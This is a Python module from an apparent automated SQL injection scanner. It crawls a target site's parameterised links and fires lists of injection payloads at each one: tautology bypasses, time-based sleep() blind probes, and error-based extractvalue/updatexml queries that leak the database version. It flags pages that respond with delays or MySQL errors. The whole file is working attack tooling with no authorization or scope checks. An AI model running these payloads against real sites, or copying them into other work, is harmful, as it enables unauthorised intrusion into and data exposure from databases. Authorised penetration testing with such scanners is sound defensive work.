import requests
import time
import re
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from ...config import Config
from messages import SuccessMessages, ErrorMessages
from ...handler.logger.log import log_data_to_file
from ...handler.errors import TimeoutRequest
from ...handler.retry.retryrequest import RetryRequest

# Payloads for different types of SQL injection attacks
payloads = [
    "' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' #", "' OR '1'='1' /*", 
    "' OR 1=1 -- ", "' OR 1=1#", "' OR 1=1/*", "' OR '1'='1' || '1'='1", 
    "' OR '1'='1' | '1'='1"
]
blind_payloads = [
    " AND sleep(7)", " OR sleep(7)", " AND IF(1=1, sleep(7), 0)", 
    " OR IF(1=1, sleep(7), 0)"
]
error_based_payloads = [
    "'", "' AND '1'='1", "' AND '1'='2", "' OR '1'='1", "' OR '1'='2", 
    "' AND extractvalue(1,concat(0x7e,(version()),0x7e))", 
    "' AND updatexml(null,concat(0x3a,version()),null)"
]

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()
original_url = set()
found_vulnerabilities = set()
printed_urls = set() 

def find_php_links(url):
    """Finds and tests PHP links in the given URL for SQL injection vulnerabilities."""
    try:
        response = retry_request.retry(requests.get, url, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
        soup = BeautifulSoup(response.text, 'html.parser')
        php_links = [a['href'] for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']]
        unique_php_links = set()
        total_php_links = len(php_links)
        
        with ThreadPoolExecutor(max_workers=CONFIG.threads()) as executor:
            futures = [executor.submit(test_sql_injection, format_link(url, link)) for link in php_links if link not in unique_php_links]
            for future in futures:
                unique_php_links.add(future.result())
                remaining_links = total_php_links - len(unique_php_links)
                print(SuccessMessages.PROCESSING_SQL + str(remaining_links))
    except TimeoutRequest as e:
        print(f"Timeout error occurred: {e}")
    except Exception as e:
        print(f"Error occurred: {e}")

def format_link(base_url, link):
    """Formats a link to ensure it is absolute and cleans up common URL issues."""
    if not link.startswith(('http', 'https')):
        link = f'{base_url}{link}'
    link = strip_url_fragment(link)
    link = remove_dot_segments(link)
    return link

def test_sql_injection(url):
    
    if url not in original_url:
        original_url.add(url)
        for payload in payloads + blind_payloads + error_based_payloads:
            try:
                is_blind = payload in blind_payloads
                is_error_based = payload in error_based_payloads
                modified_url = replace_parameter_value_with_payload(url, payload)
                response, response_time = send_payload(modified_url, is_blind)
                
                if modified_url not in original_url:
                    original_url.add(modified_url)
                    if is_vulnerable(response, response_time, is_blind, is_error_based):
                        vulnerability_key = (modified_url, is_blind, is_error_based)
                        if vulnerability_key not in found_vulnerabilities:
                            found_vulnerabilities.add(vulnerability_key)
                            if modified_url not in printed_urls:  
                                printed_urls.add(modified_url)  
                                print_vulnerability_found(modified_url)
                    
                    SQL_INJ = ', '.join(printed_urls)
                    log_data_to_file(SQL_INJ, "links", "sqlvuln")
            except Exception as e:
                print(f"Error occurred: {e}")
    return url

def send_payload(url, is_blind):
    """Sends a payload to the given URL and measures the response time if necessary."""
    start_time = time.time()
    response = retry_request.retry(requests.get, url, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
    response_time = time.time() - start_time if is_blind else 0
    return response, response_time

def is_vulnerable(response, response_time, is_blind, is_error_based):
    """Determines if a response indicates a SQL injection vulnerability."""
    if is_blind:
        return response_time > 6
    elif is_error_based:
        return any(error_indicator in response.text for error_indicator in ['SQL syntax;', 'mysql_fetch_assoc', 'mysql_fetch_array', 'mysql_num_rows'])
    else:
        return 'mysql_fetch_array()' in response.text or 'You have an error in your SQL syntax;' in response.text

def print_vulnerability_found(url):
    """Prints a message indicating a SQL injection vulnerability was found."""
    message = SuccessMessages.FOUND_SQL_INJECTION
    print(f"{message} {url}")

def strip_url_fragment(url):
    """Removes the fragment component from a URL."""
    return url.split('#', 1)[0]

def remove_dot_segments(url):
    """Removes dot segments from a URL."""
    return url.replace('/./', '/')

def replace_parameter_value_with_payload(url, payload):
    """Replaces the value of parameters in a URL with a given payload."""
    url_with_payload = re.sub(r"=([^&]+)", f"={payload}", url)
    return url_with_payload

